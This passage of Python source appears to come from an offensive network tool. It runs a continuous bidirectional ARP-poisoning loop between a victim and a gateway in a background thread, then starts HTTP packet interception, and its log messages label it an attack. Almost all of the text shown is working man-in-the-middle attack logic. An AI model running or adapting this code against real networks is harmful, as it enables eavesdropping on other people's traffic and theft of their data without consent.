        logger.info(f"[ARP-POISON] Interval: {AttackConfig.ARP_POISON_INTERVAL} seconds")
        
        poison_count = 0
        while True:
            # Bidirectional poisoning
            poison(victim_ip, victim_mac, gateway_ip)
            poison(gateway_ip, gateway_mac, victim_ip)
            
            poison_count += 2
            if poison_count % 20 == 0:  # Log every 20 rounds (40 packets)
                logger.debug(f"[ARP-POISON] Sent {poison_count} poison packets")
            
            time.sleep(AttackConfig.ARP_POISON_INTERVAL)

    poison_thread = threading.Thread(target=poison_loop, daemon=True)
    poison_thread.start()
    
    # Give ARP poisoning time to take effect
    logger.info("[ATTACK] Waiting 3 seconds for ARP poisoning to take effect...")
    time.sleep(3)

    # Start HTTP interception
    start_packet_interception()

if __name__ == "__main__":
    main() 